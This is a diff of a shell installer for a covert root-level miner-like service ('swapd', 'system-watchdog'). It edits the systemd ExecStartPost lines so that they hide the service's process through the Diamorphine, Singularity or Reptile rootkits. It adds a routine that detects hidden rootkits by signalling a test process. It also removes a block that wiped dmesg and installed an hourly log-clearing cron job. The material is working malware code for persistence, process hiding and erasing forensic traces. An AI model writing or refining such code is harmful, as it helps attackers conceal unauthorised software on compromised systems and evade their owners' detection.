@@ -1730,7 +1730,7 @@ Type=simple
 User=root
 WorkingDirectory=/root/.swapd
 ExecStart=$EXEC_START
-ExecStartPost=/bin/bash -c 'sleep 3; if lsmod | grep -q "^diamorphine"; then kill -31 \$(systemctl show --property MainPID --value swapd.service) 2>/dev/null; elif lsmod | grep -q "^singularity"; then kill -59 \$(systemctl show --property MainPID --value swapd.service) 2>/dev/null; elif lsmod | grep -q "^rootkit"; then kill -31 \$(systemctl show --property MainPID --value swapd.service) 2>/dev/null; elif lsmod | grep -q "^reptile"; then reptile_cmd hide \$(systemctl show --property MainPID --value swapd.service) 2>/dev/null; fi'
+ExecStartPost=/bin/bash -c 'sleep 5; PID=\$(systemctl show --property MainPID --value swapd.service); if [ -n "\$PID" ] && [ "\$PID" != "0" ]; then kill -59 \$PID 2>/dev/null || kill -31 \$PID 2>/dev/null; fi'
 Restart=no
 Nice=19
 CPUQuota=95%
@@ -1832,7 +1832,7 @@ After=network.target
 Type=simple
 User=root
 ExecStart=/usr/local/bin/system-watchdog
-ExecStartPost=/bin/bash -c 'sleep 3; if lsmod | grep -q "^diamorphine"; then kill -31 $(systemctl show --property MainPID --value system-watchdog.service) 2>/dev/null; elif lsmod | grep -q "^singularity"; then kill -59 $(systemctl show --property MainPID --value system-watchdog.service) 2>/dev/null; elif lsmod | grep -q "^rootkit"; then kill -31 $(systemctl show --property MainPID --value system-watchdog.service) 2>/dev/null; elif lsmod | grep -q "^reptile"; then reptile_cmd hide $(systemctl show --property MainPID --value system-watchdog.service) 2>/dev/null; fi'
+ExecStartPost=/bin/bash -c 'sleep 5; PID=$(systemctl show --property MainPID --value system-watchdog.service); if [ -n "$PID" ] && [ "$PID" != "0" ]; then kill -59 $PID 2>/dev/null || kill -31 $PID 2>/dev/null; fi'
 Restart=no
 StandardOutput=null
 StandardError=null
@@ -3463,42 +3463,78 @@ echo "HIDING PROCESSES (INTELLIGENT DETECTION)"
 echo "=========================================="
 echo ""
 
-# Function to detect rootkit and get correct signal
+# Function to detect rootkit and get correct signal (handles HIDDEN rootkits)
 detect_rootkit() {
-    # Check for Diamorphine
+    # First check lsmod (in case rootkit is visible)
     if lsmod | grep -q "^diamorphine"; then
         ROOTKIT_NAME="Diamorphine"
         HIDE_SIGNAL=31
-        echo "[✓] Detected: Diamorphine (signal -31)"
+        echo "[✓] Detected: Diamorphine via lsmod (signal -31)"
         return 0
     fi
     
-    # Check for Singularity
     if lsmod | grep -q "^singularity"; then
         ROOTKIT_NAME="Singularity"
         HIDE_SIGNAL=59
-        echo "[✓] Detected: Singularity (signal -59)"
+        echo "[✓] Detected: Singularity via lsmod (signal -59)"
         return 0
     fi
     
-    # Check for Reptile
     if lsmod | grep -q "^reptile"; then
         ROOTKIT_NAME="Reptile"
         HIDE_SIGNAL=0
-        echo "[✓] Detected: Reptile (uses reptile_cmd)"
+        echo "[✓] Detected: Reptile via lsmod"
         return 0
     fi
     
-    # Check for Crypto-Miner Rootkit
     if lsmod | grep -q "^rootkit"; then
         ROOTKIT_NAME="Crypto-RK"
         HIDE_SIGNAL=31
-        echo "[✓] Detected: Crypto-Miner Rootkit (signal -31)"
+        echo "[✓] Detected: Crypto-RK via lsmod (signal -31)"
         return 0
     fi
     
+    # Rootkit might be HIDDEN - test with signals
+    echo "[*] No rootkit in lsmod - testing for HIDDEN rootkit..."
+    
+    # Create test process
+    sleep 333 &
+    TEST_PID=$!
+    
+    # Test Singularity first (signal -59) - most common for hidden rootkits
+    kill -59 $TEST_PID 2>/dev/null
+    sleep 1
+    
+    if ps -p $TEST_PID >/dev/null 2>&1; then
+        # Process alive - check if hidden
+        if ! ps aux | grep "sleep 333" | grep -v grep >/dev/null 2>&1; then
+            ROOTKIT_NAME="Singularity"
+            HIDE_SIGNAL=59
+            echo "[✓] Detected: Singularity (HIDDEN rootkit, signal -59)"
+            kill -9 $TEST_PID 2>/dev/null
+            return 0
+        else
+            # Not hidden by -59, try Diamorphine (signal -31)
+            kill -31 $TEST_PID 2>/dev/null
+            sleep 1
+            
+            if ps -p $TEST_PID >/dev/null 2>&1; then
+                if ! ps aux | grep "sleep 333" | grep -v grep >/dev/null 2>&1; then
+                    ROOTKIT_NAME="Diamorphine"
+                    HIDE_SIGNAL=31
+                    echo "[✓] Detected: Diamorphine (HIDDEN rootkit, signal -31)"
+                    kill -9 $TEST_PID 2>/dev/null
+                    return 0
+                fi
+            fi
+            kill -9 $TEST_PID 2>/dev/null
+        fi
+    else
+        kill -9 $TEST_PID 2>/dev/null
+    fi
+    
     # No rootkit found
-    echo "[!] NO ROOTKIT LOADED!"
+    echo "[!] NO ROOTKIT DETECTED!"
     ROOTKIT_NAME=""
     HIDE_SIGNAL=0
     return 1
@@ -3630,39 +3666,3 @@ echo ""
 if [ -n "$ROOTKIT_NAME" ]; then
     echo "Rootkit: $ROOTKIT_NAME"
     if [ "$HIDE_SIGNAL" != "0" ]; then
-        echo "Hide signal: kill -$HIDE_SIGNAL <PID>"
-    else
-        echo "Hide method: reptile_cmd hide <PID>"
-    fi
-    echo ""
-fi
-
-echo "Service: systemctl status swapd"
-echo "Logs: journalctl -u swapd -f"
-echo ""
-
-# ==================== FINAL STEALTH: CLEAR ALL TRACES ====================
-echo "=========================================="
-echo "FINAL STEALTH CLEANUP"
-echo "=========================================="
-echo ""
-
-echo "[*] Clearing dmesg kernel ring buffer..."
-dmesg -C 2>/dev/null || true
-echo "[✓] dmesg cleared"
-
-echo "[*] Setting up automatic dmesg clearing..."
-DMESG_CRON="0 * * * * /usr/bin/dmesg -C 2>/dev/null"
-if crontab -l 2>/dev/null | grep -q "dmesg -C"; then
-    echo "[✓] Auto-clear cron job already exists"
-else
-    (crontab -l 2>/dev/null; echo "$DMESG_CRON") | crontab - 2>/dev/null
-    echo "[✓] Added hourly dmesg auto-clear"
-fi
-
-echo ""
-echo "[✓] All kernel log traces removed"
-echo "[✓] Hourly auto-clear enabled"
-echo ""
-
-exit 0
